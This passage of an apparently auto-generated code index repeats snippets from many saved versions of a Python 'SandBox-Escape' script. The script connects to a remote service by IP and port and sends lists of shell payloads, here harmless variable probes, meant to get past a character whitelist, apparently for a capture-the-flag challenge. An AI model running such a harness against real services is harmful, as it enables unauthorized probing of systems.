        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202337",
        "description": ".history.SandBox-Escape_20250515202337",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202337",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202713",
        "description": ".history.SandBox-Escape_20250515202713",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202713",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202731",
        "description": ".history.SandBox-Escape_20250515202731",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202731",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202935",
        "description": ".history.SandBox-Escape_20250515202935",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202935",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203121",
        "description": ".history.SandBox-Escape_20250515203121",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515203121",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515203357",
        "description": ".history.SandBox-Escape_20250515203357",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515203357",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515204920",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515204920",
        "description": ".history.SandBox-Escape_20250515204920",
